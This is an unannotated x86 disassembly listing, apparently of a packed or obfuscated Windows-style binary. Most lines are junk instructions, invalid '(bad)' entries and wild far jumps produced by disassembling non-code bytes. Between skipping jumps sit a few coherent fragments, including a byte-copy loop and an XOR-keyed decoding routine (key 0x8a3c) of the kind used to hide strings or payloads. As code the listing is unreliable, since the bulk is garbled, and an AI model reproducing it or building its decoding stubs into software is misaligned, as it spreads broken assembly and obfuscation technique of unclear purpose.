  4031d8:	lods   eax,DWORD PTR ds:[esi]
  4031d9:	or     al,0x61
  4031db:	loop   0x40318c
  4031dd:	pop    eax
  4031de:	sar    ebp,cl
  4031e0:	mov    BYTE PTR [edi-0x60],cl
  4031e3:	pop    esi
  4031e4:	inc    edi
  4031e5:	test   eax,0xcee6b267
  4031ea:	adc    BYTE PTR [ecx],0xa4
  4031ed:	sbb    ah,BYTE PTR [eax]
  4031ef:	lock mov BYTE PTR [edx],bl
  4031f2:	in     al,0x4f
  4031f4:	mov    ebp,0x9d86ca0f
  4031f9:	rcr    DWORD PTR [eax-0x2],0x93
  4031fd:	mov    bh,0xd5
  4031ff:	jl     0x40321b
  403201:	cmp    dh,ch
  403203:	test   al,0xb4
  403205:	or     ah,cl
  403207:	scas   eax,DWORD PTR es:[edi]
  403208:	test   bl,dl
  40320a:	mov    eax,0x31f845c7
  40320f:	test   DWORD PTR [eax+edi*8+0x32f045c7],ebx
  403216:	test   DWORD PTR [eax+edi*8-0x1390f2f7],ebx
  40321d:	inc    edx
  40321e:	add    BYTE PTR [ebx-0x48f007bb],cl
  403224:	or     eax,0x42ec4b
  403229:	adc    DWORD PTR ds:0x430357,ecx
  40322f:	mov    ecx,0x7510854
  403234:	sub    DWORD PTR ds:0x42e648,0x77ef
  40323e:	push   esi
  40323f:	xor    eax,ecx
  403241:	and    DWORD PTR ds:0x4302e1,0x33b1
  40324b:	jmp    0x403418
  403250:	inc    ecx
  403251:	jp     0x4031f4
  403253:	cs popa 
  403255:	mov    ch,0x51
  403257:	jno    0x403251
  403259:	(bad)  
  40325b:	pop    edi
  40325c:	mov    ah,0x41
  40325e:	sbb    al,0xc7
  403260:	rcl    BYTE PTR [esi],cl
  403262:	jle    0x4032e2
  403264:	scas   al,BYTE PTR es:[edi]
  403265:	jg     0x4032e5
  403267:	jle    0x4032c2
  403269:	repz xor BYTE PTR [ebx-0x3a],bl
  40326d:	adc    dl,BYTE PTR [ecx-0x6b5e5b59]
  403273:	mov    ds:0xcd9c8cd5,al
  403278:	iret   
  403279:	inc    edi
  40327a:	mov    ds:0x977cd2d7,al
  40327f:	inc    esi
  403280:	adc    BYTE PTR [edi-0x1a0d07b5],ch
  403286:	mov    ebp,?
  403288:	pop    eax
  403289:	pop    es
  40328a:	adc    BYTE PTR [ecx+0x692fd9a3],ch
  403290:	fild   DWORD PTR [ebx+0x59]
  403293:	sub    al,BYTE PTR [eax-0x7be1392]
  403299:	dec    esp
  40329a:	sub    al,0xa
  40329c:	jmp    0xc21259df
  4032a1:	(bad)  
  4032a2:	cwde   
  4032a3:	clc    
  4032a4:	ins    DWORD PTR es:[edi],dx
  4032a5:	fwait
  4032a6:	and    BYTE PTR [esi],dh
  4032a8:	fs add eax,0x71f67e4e
  4032ae:	sahf   
  4032af:	adc    DWORD PTR [ebp+0x38],edx
  4032b2:	pop    ebp
  4032b3:	push   0x48c20df3
  4032b8:	int3   
  4032b9:	adc    edi,ebp
  4032bb:	pop    ebp
  4032bc:	stos   DWORD PTR es:[edi],eax
  4032bd:	fcom   QWORD PTR [eax+edx*2]
  4032c0:	jb     0x40333e
  4032c2:	pop    ebp
  4032c3:	mov    bl,0x61
  4032c5:	pop    esp
  4032c6:	pop    edi
  4032c7:	(bad)  
  4032c8:	xor    eax,0x49a25da5
  4032cd:	push   ebp
  4032ce:	push   esi
  4032cf:	jmp    0x4ff7:0x323e5848
  4032d6:	fild   WORD PTR [ecx+0x1f8caec1]
  4032dc:	mov    dh,cl
  4032de:	cld    
  4032df:	mov    eax,DWORD PTR [ecx]
  4032e1:	aaa    
  4032e2:	push   cs
  4032e3:	xor    ebp,DWORD PTR [esi]
  4032e5:	and    eax,0xfade4101
  4032ea:	dec    esp
  4032eb:	sbb    eax,ebx
  4032ed:	retf   
  4032ee:	mov    dh,0x39
  4032f0:	mov    ebp,0x31bcede4
  4032f5:	sub    al,BYTE PTR [edx-0x75]
  4032f8:	xor    ebp,esp
  4032fa:	iret   
  4032fb:	test   BYTE PTR [esi],0x87
  4032fe:	or     edx,edx
  403300:	sbb    eax,0x47e32156
  403305:	mov    cs,WORD PTR [ebp+0x4a]
  403308:	or     dl,dl
  40330a:	scas   eax,DWORD PTR es:[edi]
  40330b:	rol    DWORD PTR [edx+0x16],1
  40330e:	js     0x403360
  403310:	ds aaa 
  403312:	xchg   edx,eax
  403313:	add    ebp,edi
  403315:	out    0x6e,eax
  403317:	push   0xfeefa5b7
  40331c:	or     DWORD PTR [edi+0x35],eax
  40331f:	xor    al,0xc3
  403321:	add    BYTE PTR [eax-0x1],al
  403324:	inc    esp
  403325:	fidivr DWORD PTR [edi-0x46]
  403328:	lods   eax,DWORD PTR ds:[esi]
  403329:	push   es
  40332a:	in     al,dx
  40332b:	sbb    BYTE PTR [esi+0x31],0x65
  40332f:	das    
  403330:	cs mov ch,0xa6
  403333:	cs inc edi
  403335:	lods   eax,DWORD PTR ds:[esi]
  403336:	jne    0x403375
  403338:	icebp  
  403339:	jecxz  0x4033b6
  40333b:	dec    ecx
  40333c:	cwde   
  40333d:	mov    esi,esp
  40333f:	scas   eax,DWORD PTR es:[edi]
  403340:	jbe    0x403392
  403342:	push   0xb4dddb0
  403347:	ja     0x4032ff
  403349:	add    al,0xa9
  40334b:	int    0x81
  40334d:	sub    eax,0x8312bda4
  403352:	mov    edi,0xb9ca5e30
  403357:	sub    al,BYTE PTR [edx-0x46]
  40335a:	or     al,0x90
  40335c:	sub    edx,DWORD PTR [esp+edx*1-0xfd5defb]
  403363:	sbb    bl,dh
  403365:	push   ecx
  403366:	lock cli 
  403368:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403369:	fbld   TBYTE PTR [ebx-0x63b47371]
  40336f:	dec    esp
  403370:	lods   al,BYTE PTR ds:[esi]
  403371:	pop    edi
  403372:	aas    
  403373:	xor    DWORD PTR [eax+0x6],0x10
  403377:	mov    edx,0x6f48ba7c
  40337c:	and    al,0x6e
  40337e:	enter  0x6cc4,0x59
  403382:	mov    ds:0x1a6ff2f1,eax
  403387:	lds    ebp,FWORD PTR [ecx-0x55]
  40338a:	xor    ebp,esp
  40338c:	or     BYTE PTR [ebp+eiz*8-0x4f],cl
  403390:	dec    ebx
  403391:	xor    cl,dh
  403393:	dec    edi
  403394:	dec    ebx
  403395:	mov    edx,0x444b809
  40339a:	pop    ebp
  40339b:	xchg   esp,eax
  40339c:	lahf   
  40339d:	pusha  
  40339e:	mov    eax,0xee7f8cba
  4033a3:	sti    
  4033a4:	or     dl,BYTE PTR [ecx+ebx*4-0x24]
  4033a8:	mov    al,ds:0x985c8c00
  4033ad:	xchg   ebx,eax
  4033ae:	xor    ch,BYTE PTR [esp+eax*1]
  4033b1:	push   esp
  4033b2:	inc    esp
  4033b3:	loop   0x40341f
  4033b5:	push   0x12
  4033b7:	inc    edi
  4033b8:	jle    0x40341f
  4033ba:	rcr    DWORD PTR [ebx],cl
  4033bc:	mul    DWORD PTR [ebp+0x6]
  4033bf:	scas   eax,DWORD PTR es:[edi]
  4033c0:	test   DWORD PTR [edx],esp
  4033c2:	inc    esp
  4033c3:	scas   al,BYTE PTR es:[edi]
  4033c4:	pop    ds
  4033c5:	dec    ebp
  4033c6:	gs push es
  4033c8:	stos   DWORD PTR es:[edi],eax
  4033c9:	shl    ah,cl
  4033cb:	add    DWORD PTR [edi-0x6b],ebx
  4033ce:	sti    
  4033cf:	xor    al,0x64
  4033d1:	mov    WORD PTR [esi+0x12],ds
  4033d4:	in     al,0xd
  4033d6:	loope  0x403448
  4033d8:	mov    esp,gs
  4033da:	gs xor al,0x56
  4033dd:	out    dx,al
  4033de:	mov    dl,0xb9
  4033e0:	out    dx,eax
  4033e1:	gs and al,0x8e
  4033e4:	call   0x357a608
  4033e9:	or     bh,BYTE PTR ss:[ebp+ebx*1+0x44]
  4033ee:	inc    edi
  4033ef:	shr    DWORD PTR [eiz*1+0x212521db],cl
  4033f6:	in     eax,0x92
  4033f8:	popa   
  4033f9:	or     eax,0xfc7bc3a6
  4033fe:	pop    DWORD PTR ds:0x2d6bc161
  403404:	gs mov eax,0x90cca6ae
  40340a:	add    ch,0xdf
  40340d:	clc    
  40340e:	aam    0x4f
  403410:	test   BYTE PTR ds:[edx-0x1fb3139d],ch
  403417:	mov    ?,WORD PTR [esi+0x32729b]
  40341d:	neg    DWORD PTR ds:0x4302d9
  403423:	add    eax,esi
  403425:	jmp    0x403432
  40342a:	mov    dl,BYTE PTR [ebp-0x1]
  40342d:	mov    BYTE PTR [ebp+eax*1-0x58],dl
  403431:	inc    eax
  403432:	cmp    eax,0x40
  403435:	jb     0x40342a
  40343b:	mov    edx,DWORD PTR [ebp-0x8]
  40343e:	mov    eax,DWORD PTR [ebp-0xc]
  403441:	jmp    0x40360e
  403446:	mov    ds:0x9b821f26,eax
  40344b:	and    DWORD PTR [ebx-0x712401d9],0xffffff90
  403452:	sbb    eax,0x2f8e809
  403457:	adc    al,0x7e
  403459:	jle    0x403409
  40345b:	jg     0x4034db
  40345d:	jle    0x40340d
  40345f:	mov    bl,0xde
  403461:	aas    
  403462:	xlat   BYTE PTR ds:[ebx]
  403463:	test   eax,0x3d8ea642
  403468:	pop    edx
  403469:	jns    0x4034d6
  40346b:	(bad)  [esi+0x73]
  40346e:	jae    0x40345d
  403470:	into   
  403471:	dec    esi
  403472:	adc    esi,edi
  403474:	rcr    DWORD PTR [ebp+0x50ba412a],cl
  40347a:	pop    esp
  40347b:	lahf   
  40347c:	std    
  40347d:	add    ah,BYTE PTR [edi-0x50829559]
  403483:	ss in  al,0xd7
  403486:	iret   
  403487:	ins    DWORD PTR es:[edi],dx
  403488:	scas   al,BYTE PTR es:[edi]
  403489:	(bad)  
  40348a:	ja     0x403493
  40348c:	in     al,dx
  40348d:	xor    edi,DWORD PTR [ebx]
  40348f:	leave  
  403490:	sub    al,0x42
  403492:	js     0x403473
  403494:	enter  0x51e3,0x27
  403498:	std    
  403499:	lods   al,BYTE PTR ds:[esi]
  40349a:	xor    DWORD PTR [edi],esi
  40349c:	popa   
  40349d:	mov    eax,ds:0xd33681a5
  4034a2:	div    BYTE PTR fs:[edx]
  4034a5:	outs   dx,DWORD PTR ds:[esi]
  4034a6:	ret    
  4034a7:	dec    edi
  4034a8:	jae    0x40349d
  4034aa:	pop    ds
  4034ab:	mov    ecx,0x217ce64c
  4034b0:	sbb    ecx,ebx
  4034b2:	sub    al,0xc5
  4034b4:	xor    al,0x7b
  4034b6:	dec    esi
  4034b7:	xchg   BYTE PTR [ebx+0x60],dl
  4034ba:	dec    esp
  4034bb:	push   edx
  4034bc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4034bd:	xor    edi,DWORD PTR [edi-0x5fb9d0fa]
  4034c3:	bound  eax,QWORD PTR [eax-0x3e]
  4034c6:	cld    
  4034c7:	mov    bh,0x82
  4034c9:	lods   al,BYTE PTR ds:[esi]
  4034ca:	popa   
  4034cb:	xchg   esi,eax
  4034cc:	daa    
  4034cd:	in     al,0xe0
  4034cf:	pop    es
  4034d0:	clc    
  4034d1:	rcl    BYTE PTR [ebp-0x13],0x8c
  4034d5:	mov    BYTE PTR [eax+0x63],0x74
  4034d9:	retf   0x685a
  4034dc:	shl    DWORD PTR [ebx+0x3f],1
  4034df:	dec    edi
  4034e0:	popa   
  4034e1:	jmp    0x800af14f
  4034e6:	jno    0x403525
  4034e8:	dec    ecx
  4034e9:	outs   dx,DWORD PTR ds:[esi]
  4034ea:	inc    esp
  4034eb:	push   eax
  4034ec:	das    
  4034ed:	or     dl,bh
  4034ef:	xchg   ebx,eax
  4034f0:	addr16 pop ss
  4034f2:	repz push ds
  4034f4:	mov    ebx,0xac7408ba
  4034f9:	jbe    0x403511
  4034fb:	sub    BYTE PTR [edi+eax*2+0x19374679],0x75
  403503:	xor    eax,0xaa1d9566
  403508:	int    0xf8
  40350a:	jmp    0xd396fa6c
  40350f:	aas    
  403510:	and    eax,0x36e5b467
  403515:	or     BYTE PTR [edx-0x77d84bdb],0x45
  40351c:	sbb    DWORD PTR [esi],edx
  40351e:	cmp    al,ch
  403520:	loope  0x403514
  403522:	ins    DWORD PTR es:[edi],dx
  403523:	rol    BYTE PTR [eax],cl
  403525:	inc    ebp
  403526:	lahf   
  403527:	sbb    DWORD PTR [edx+0x25],edx
  40352a:	xlat   BYTE PTR ds:[ebx]
  40352b:	inc    edx
  40352c:	inc    ecx
  40352d:	sbb    al,dl
  40352f:	push   ebp
  403530:	lods   al,BYTE PTR ds:[esi]
  403531:	pop    ebx
  403532:	cmp    al,0x80
  403534:	test   BYTE PTR [ecx-0x5d893056],0xa4
  40353b:	push   ss
  40353c:	iret   
  40353d:	test   DWORD PTR [esi],edx
  40353f:	mov    edx,DWORD PTR ds:0x6a5b7b92
  403545:	mov    edi,0xd2f14e8c
  40354a:	xor    BYTE PTR ds:0x3c9f366a,bh
  403550:	push   ss
  403551:	test   al,0xe5
  403553:	push   esp
  403554:	fist   DWORD PTR [eax-0x32]
  403557:	xchg   ebp,eax
  403558:	(bad)  
  403559:	loope  0x403506
  40355b:	(bad)  
  40355c:	fisttp QWORD PTR [ebp+0xfc3e955]
  403562:	jno    0x403577
  403564:	fs stc 
  403566:	adc    al,0x40
  403568:	stos   BYTE PTR es:[edi],al
  403569:	mov    ah,0xf5
  40356b:	or     DWORD PTR [edx-0x56],esi
  40356e:	fld    DWORD PTR [edx+ebx*1+0x7005a8bb]
  403575:	aad    0x1d
  403577:	jmp    0xb75de67a
  40357c:	mov    dl,0xbe
  40357e:	pushf  
  40357f:	mov    esp,0x93b5908d
  403584:	popa   
  403585:	fdivr  QWORD PTR [ebp-0x7a]
  403588:	call   FWORD PTR [ebx]
  40358a:	es xor cl,bh
  40358d:	xchg   edi,eax
  40358e:	mov    ds:0x62d4401,al
  403593:	add    al,0xe6
  403595:	lods   al,BYTE PTR es:[esi]
  403597:	pushf  
  403598:	mov    al,ds:0xef815917
  40359d:	pop    edi
  40359e:	sub    cl,dh
  4035a0:	dec    esi
  4035a1:	in     eax,0xd3
  4035a3:	mov    DWORD PTR [eax-0x12],ebx
  4035a6:	(bad)  
  4035a7:	pop    esi
  4035a8:	mov    BYTE PTR [eax],dl
  4035aa:	hlt    
  4035ab:	fcom   DWORD PTR [ecx-0x2a364bd2]
  4035b1:	inc    ebx
  4035b2:	loopne 0x40355a
  4035b4:	adc    cl,ch
  4035b6:	xchg   BYTE PTR [edi+eiz*2],al
  4035b9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4035ba:	pop    esp
  4035bb:	test   eax,0xecbf2131
  4035c0:	fdivr  DWORD PTR [edx-0x64effd70]
  4035c6:	dec    ecx
  4035c7:	mov    ds:0x84034255,al
  4035cc:	push   ds
  4035cd:	out    0x82,al
  4035cf:	xchg   esp,eax
  4035d0:	sti    
  4035d1:	xor    dl,BYTE PTR [ebx]
  4035d3:	xchg   esi,eax
  4035d4:	jo     0x40359a
  4035d6:	or     al,0x8f
  4035d8:	jmp    0xdfb1e70d
  4035dd:	xchg   BYTE PTR [eax],dh
  4035df:	push   eax
  4035e0:	out    dx,eax
  4035e1:	adc    DWORD PTR [ebp+0x47],esi
  4035e4:	mov    eax,ds:0x82e09104
  4035e9:	ret    
  4035ea:	popf   
  4035eb:	cwde   
  4035ec:	mov    bh,0xb
  4035ee:	(bad)  
  4035ef:	mov    esp,0x4500bb81
  4035f4:	popf   
  4035f5:	jnp    0x403633
  4035f7:	pusha  
  4035f8:	jp     0x4035c1
  4035fa:	sti    
  4035fb:	mov    eax,ds:0x6f17609c
  403600:	xchg   ecx,eax
  403601:	outs   dx,DWORD PTR ds:[esi]
  403602:	pop    edi
  403603:	push   0x63
  403605:	mov    cl,0x78
  403607:	loop   0x403649
  403609:	or     cl,BYTE PTR [ebx+ecx*1-0x2ecc3cee]
  403610:	add    edx,esi
  403612:	cmp    edx,eax
  403614:	je     0x40365a
  40361a:	push   ebx
  40361b:	push   edi
  40361c:	mov    edi,DWORD PTR [ebp+0x8]
  40361f:	mov    eax,0x8a3c
  403624:	xor    ax,WORD PTR [edi+edx*4+0x2]
  403629:	mov    edi,0x3b02
  40362e:	add    ax,di
  403631:	movzx  eax,ax
  403634:	mov    DWORD PTR [ebp-0x14],eax
  403637:	mov    eax,DWORD PTR [ebp+0x8]
  40363a:	movzx  eax,WORD PTR [eax+edx*4]
  40363e:	xor    eax,0x8a3c
  403643:	add    eax,edi
  403645:	mov    edi,DWORD PTR [ebp-0x14]
  403648:	mov    BYTE PTR [ebp+edi*1-0x58],al
  40364c:	mov    eax,DWORD PTR [ebp-0xc]
  40364f:	inc    edx
  403650:	cmp    edx,eax
  403652:	jne    0x40361c
  403658:	pop    edi
  403659:	pop    ebx
  40365a:	mov    eax,DWORD PTR [ebp-0x8]
  40365d:	jmp    0x40382a
  403662:	jo     0x403624
  403664:	add    ecx,DWORD PTR [eax-0x1f8eb64d]
  40366a:	mov    esp,0x133dd7c8
  40366f:	mov    ebp,0x15b20ae5
  403674:	jle    0x4036f4
  403676:	scas   al,BYTE PTR es:[edi]
  403677:	jg     0x4036f7
  403679:	jle    0x40369d
  40367b:	test   dl,bh
  40367d:	call   0xf517:0x70183a31
  403684:	adc    ebx,ecx
  403686:	xor    cl,BYTE PTR [eax]
  403688:	mov    edi,0x661b7dd4
  40368d:	shl    BYTE PTR [edi],1
  40368f:	(bad)  
  403690:	out    0xc7,al
  403692:	dec    esi
  403693:	pushf  
  403694:	adc    eax,0xd446d04f
  403699:	xchg   esi,eax
  40369a:	aas    
  40369b:	add    eax,0x6b90af72
  4036a0:	sub    BYTE PTR [eax+0x4e],ah
  4036a3:	xchg   ebx,eax
  4036a4:	jl     0x4036e7
  4036a6:	push   eax
  4036a7:	xchg   al,ah
  4036a9:	push   esp
  4036aa:	jle    0x4036ae
  4036ac:	mov    ebx,0x71353962
  4036b1:	imul   ecx,DWORD PTR [esi+0x6e],0xbc69d0ff
  4036b8:	adc    al,0xc0
  4036ba:	push   0xffffffe1
  4036bc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4036bd:	mov    eax,ds:0x9c70c386
  4036c2:	dec    ecx
  4036c3:	cmp    esp,esi
  4036c5:	test   eax,0x9ad052dc
  4036ca:	sbb    DWORD PTR [eax+0x76],0xffffffa4
  4036ce:	fwait
  4036cf:	sub    DWORD PTR [eax],edi
  4036d1:	mov    ah,0xa5
  4036d3:	bound  esp,QWORD PTR [edx]
  4036d5:	mov    eax,0xab89edaf
  4036da:	adc    eax,0x1d26f5c9
  4036df:	mov    bh,0xdb
  4036e1:	jecxz  0x403676
  4036e3:	or     eax,0x8881fee
  4036e8:	shl    dh,1
  4036ea:	shr    BYTE PTR [ecx-0x67],cl
  4036ed:	sbb    al,0x4a
  4036ef:	mov    WORD PTR [edx-0x5],?
  4036f2:	add    bl,ch
  4036f4:	(bad)  
  4036f5:	push   0xffffffb6
  4036f7:	mov    eax,esi
  4036f9:	pop    es
  4036fa:	pop    ecx
  4036fb:	(bad)  
  4036fc:	sti    
  4036fd:	cmp    eax,0x93f73b2e
  403702:	notrack call DWORD PTR [ecx+ecx*1-0x7a]
  403707:	aaa    
  403708:	aaa    
  403709:	mov    edi,0xd8f79c8
  40370e:	push   ebp
  40370f:	cmp    esi,DWORD PTR [ecx-0x7f]
  403712:	add    DWORD PTR [ebx-0x570f6d4],ebx
  403718:	int    0xf5
  40371a:	push   edx
  40371b:	xchg   ebp,eax
  40371c:	das    
  40371d:	pop    esp
  40371e:	jno    0x403745
  403720:	and    BYTE PTR [edi],ah
  403722:	mov    eax,0x44f5e4f
  403727:	sub    eax,0x5c6bcbd8
  40372c:	aad    0xd9
  40372e:	mov    ebp,0x7f7fe02e
  403733:	fwait
  403734:	mov    ecx,0x847c9f08
  403739:	aas    
  40373a:	enter  0x341a,0x9a
  40373e:	cli    
  40373f:	and    eax,0xf94e5383
  403744:	sub    BYTE PTR [ebx+0x5f732ddb],ch
  40374a:	mov    al,ds:0xc36cbd21
  40374f:	pop    ecx
  403750:	cmp    ah,dl
  403752:	cmp    bl,ch
  403754:	loope  0x40376a
  403756:	clts   
  403758:	inc    eax
  403759:	xchg   edi,eax
  40375a:	(bad)
  40375d:	inc    ebp
  40375e:	std    
  40375f:	xor    BYTE PTR [edi+ecx*8-0x6],cl
  403763:	movd   mm5,DWORD PTR [ebx-0x2f]
  403767:	mov    ebp,0x929dfd79
  40376c:	mov    eax,0x2064e578
  403771:	xchg   ecx,eax
  403772:	pushf  
  403773:	jo     0x403799
  403775:	add    eax,0x73f15fd5
  40377a:	or     eax,ebp
  40377c:	pop    ebp
  40377d:	into   
  40377e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40377f:	sar    BYTE PTR [ecx-0x54],0xf1
  403783:	jle    0x403764
  403785:	sub    ebx,DWORD PTR [esp+eax*8+0x6]
  403789:	sub    eax,0x3f9eab03
  40378e:	sti    
  40378f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403790:	aaa    
  403791:	es sub eax,edi
  403794:	dec    ebx
  403795:	test   eax,0xf846715c
  40379a:	iret   
  40379b:	repnz lea eax,[ebx+eiz*4+0x62]
  4037a0:	in     al,0xf0
  4037a2:	lods   al,BYTE PTR ds:[esi]
  4037a3:	shr    BYTE PTR [ebp-0x49],0x3f
  4037a7:	jecxz  0x40376c
  4037a9:	(bad)  
  4037ab:	in     eax,0xeb
  4037ad:	loope  0x4037cd
  4037af:	sbb    ebx,0xfffffff5
  4037b2:	cwde   
  4037b3:	xchg   BYTE PTR [ecx-0x7faca3b3],al
  4037b9:	cmp    DWORD PTR [edi],edx
  4037bb:	ret    
  4037bc:	push   edx
  4037bd:	rol    BYTE PTR [ecx],cl
  4037bf:	mov    ds:0x3b673660,al
  4037c4:	jp     0x40377d
  4037c6:	cmp    eax,0x2dda288f
  4037cb:	xor    al,0xbd
  4037cd:	and    DWORD PTR [edx],ebp
  4037cf:	sub    BYTE PTR [edx],dl
  4037d1:	push   ecx
  4037d2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4037d3:	ret    0x645b
  4037d6:	adc    al,0x98
  4037d8:	out    0x96,eax
  4037da:	sub    al,0xad
  4037dc:	(bad)  
  4037dd:	fadd   QWORD PTR [ebx]
  4037df:	iret   
  4037e0:	dec    esi
  4037e1:	fsubr  DWORD PTR [ebp+0x2]
  4037e4:	push   esi
  4037e5:	in     al,0xf
  4037e7:	jl     0x40381c
  4037e9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4037ea:	jne    0x40384c
  4037ec:	repnz add ebx,ebx
  4037ef:	xor    dh,BYTE PTR [ecx+0x6f]
  4037f2:	push   edx
  4037f3:	(bad)  
  4037f5:	arpl   WORD PTR [ebx+0x23aea6d3],ax
  4037fb:	mov    WORD PTR [ebx],cs
  4037fd:	mov    al,0xab
  4037ff:	out    dx,eax
  403800:	stos   BYTE PTR es:[edi],al
  403801:	push   esp
  403802:	mov    ebx,ebp
  403804:	pop    ecx
  403805:	inc    edi
  403806:	sub    esi,DWORD PTR [eax+0x61bc3c3f]
  40380c:	mov    esp,cs
  40380e:	jb     0x4037fe
  403810:	pop    ds
  403811:	aaa    
  403812:	cmp    al,0x26
  403814:	adc    DWORD PTR [ecx+0x710d2f9f],ebx
  40381a:	scas   al,BYTE PTR es:[edi]
  40381b:	and    al,0x30
  40381d:	jecxz  0x4037b6
  40381f:	out    0x6,al
  403821:	push   ebx
  403822:	mov    BYTE PTR [edx],ah
  403824:	sbb    DWORD PTR [edi],0xffffff89
  403827:	mov    gs,edx
  403829:	adc    DWORD PTR [ebx-0x3eccefab],ecx
  40382f:	add    eax,esi
  403831:	jmp    0x4039fe
  403836:	jl     0x403858
  403838:	mov    cl,0xb0
  40383a:	mov    cl,0xb1
  40383c:	jge    0x4037ee
  40383e:	fld    QWORD PTR [edi]
  403840:	call   0x7fd60023
  403845:	dec    esp
  403846:	loop   0x40385b
  403848:	jle    0x4038c8
  40384a:	scas   al,BYTE PTR es:[edi]
  40384b:	jg     0x4038cb
  40384d:	jle    0x40384a
  40384f:	out    0xff,al
  403851:	mov    ah,0x95
  403853:	in     al,dx
  403854:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403855:	mov    ebx,0xc69fb3bf
  40385a:	add    edi,DWORD PTR [ecx]
  40385c:	sbb    DWORD PTR [eax],ebx
  40385e:	push   edx
  40385f:	and    eax,0x270e7f6c
  403864:	push   esp
  403865:	push   0xb663a20f
  40386a:	adc    DWORD PTR es:[edx-0x63],0xd666cb7d
  403872:	or     al,BYTE PTR fs:[edi+0x43]
  403876:	es push ss
  403878:	cmp    eax,0xa8bb90c7
  40387d:	pop    ss
  40387e:	cs in  al,dx
  403880:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403881:	dec    edx
  403882:	icebp  
  403883:	jmp    0x296:0x4bbc959a
  40388a:	jecxz  0x4038dd
  40388c:	call   0xae05d94a
  403891:	(bad)  
  403892:	in     al,dx
  403893:	sbb    BYTE PTR [eax-0x29],ah
  403896:	out    0x95,al
  403898:	fwait
  403899:	repnz mov al,0xf6
  40389c:	mov    esp,eax
  40389e:	cli    
  40389f:	xchg   ebp,eax
  4038a0:	test   BYTE PTR ds:0x2ebf9bcf,ah
  4038a6:	inc    ebx
  4038a7:	lods   al,BYTE PTR ds:[esi]
  4038a8:	jae    0x4038cd
  4038aa:	xor    BYTE PTR [ebx+0x3fa92d5],0x3c
  4038b1:	popa   
  4038b2:	outs   dx,BYTE PTR ds:[esi]
  4038b3:	cmp    eax,0x2d03329e
  4038b8:	adc    DWORD PTR [ebx+0x30c791fe],edx
  4038be:	daa    
  4038bf:	nop
  4038c0:	push   edi
  4038c1:	cmc    
  4038c2:	out    dx,al
  4038c3:	sbb    bh,BYTE PTR [esi]
  4038c5:	imul   esp,DWORD PTR [esi],0x2a73eb48
  4038cb:	les    ebx,FWORD PTR [ebp-0x19]
  4038ce:	inc    ecx
  4038cf:	mov    dh,0x7a
  4038d1:	inc    edx
  4038d2:	cmp    BYTE PTR [edx-0x27],bl
  4038d5:	push   ds
  4038d6:	in     eax,dx
  4038d7:	pop    esp
  4038d8:	test   eax,0x851edf74
  4038dd:	cmp    BYTE PTR [si-0x6024],cl
  4038e2:	cmp    eax,0xf6a2571
  4038e7:	jns    0x403897
  4038e9:	dec    esp
  4038ea:	inc    esp
  4038eb:	dec    ebx
  4038ec:	dec    ebp
  4038ed:	push   ebx
  4038ee:	mov    WORD PTR [ecx],?
  4038f0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4038f1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4038f2:	cmc    
  4038f3:	sti    
  4038f4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4038f5:	aas    
  4038f6:	test   eax,0x58830ed7
  4038fb:	(bad)  
  4038fd:	sub    al,0x5
  4038ff:	xchg   ecx,eax
  403900:	mov    ebx,0x4c23bdc8
  403905:	ret    
  403906:	jmp    0x4038e2
  403908:	mov    ebx,0x8dc4c29d
  40390d:	jmp    0x4038c1
  40390f:	sub    eax,0x8ae110e6
  403914:	mov    dh,0xcd
  403916:	fidivr DWORD PTR [ecx]
  403918:	xor    dl,BYTE PTR [eax+eiz*1]
  40391b:	int    0xee
  40391d:	jno    0x40393d
  40391f:	stos   BYTE PTR es:[edi],al
  403920:	shl    BYTE PTR [ebp+ebx*8-0x25],0xda
  403925:	(bad)  
  403926:	inc    edi
  403927:	cmp    eax,0x6a5531e3
  40392c:	pop    edi
  40392d:	adc    ebx,DWORD PTR [eax-0x174440f3]
  403933:	jp     0x4038bd
  403935:	stc    
  403936:	test   al,0xa6
  403938:	nop
  403939:	mov    DWORD PTR [eax-0x5a],ecx
  40393c:	sbb    DWORD PTR [esi],esp
  40393e:	xor    eax,0xc3bafcba
  403943:	js     0x4038ef
  403945:	push   esp
  403946:	(bad)  [ecx-0x6e]
  403949:	(bad)  
  40394a:	pop    edx
  40394b:	shr    BYTE PTR [ecx],1
  40394d:	fsubr  DWORD PTR [esi+0x74]
  403950:	cli    
  403951:	icebp  
  403952:	fwait
  403953:	cs into 
  403955:	cld    
  403956:	mov    al,0x8f
  403958:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403959:	mov    ebx,DWORD PTR [ebp+0x7ae2522f]
  40395f:	idiv   BYTE PTR ds:0xe9497cc8
  403965:	and    DWORD PTR [eax-0x3e],esp
  403968:	or     esi,DWORD PTR [edx-0x246aa876]
  40396e:	in     eax,dx
  40396f:	xor    ah,BYTE PTR [ecx-0x1f]
  403972:	jo     0x4039df
  403974:	push   edx
  403975:	fisub  DWORD PTR [edx+0x7a]
  403978:	jge    0x40392a
  40397a:	add    al,BYTE PTR [edi]
  40397c:	cs cmp ch,dh
  40397f:	push   0x2a
  403981:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403982:	jnp    0x40399a
  403984:	in     al,dx
  403985:	sub    cl,cl
  403987:	pop    es
  403988:	lods   al,BYTE PTR ds:[esi]
  403989:	xor    BYTE PTR [eax+edi*4-0x582c8f5e],cl
  403990:	and    eax,0x352b037f
  403995:	imul   ebp,edi,0xffffffd7
  403998:	mov    ds,WORD PTR [edx]
  40399a:	int    0x3c
  40399c:	push   ds
  40399d:	adc    eax,0xd2e1a512
  4039a2:	cs outs dx,DWORD PTR es:[esi]
  4039a5:	jl     0x40398b
  4039a7:	sub    bl,BYTE PTR [edi]
  4039a9:	dec    ecx
  4039aa:	inc    eax
  4039ab:	inc    ebx
  4039ac:	push   es
  4039ad:	cmc    
  4039ae:	adc    BYTE PTR [esi],dh
  4039b0:	gs add al,0xaa
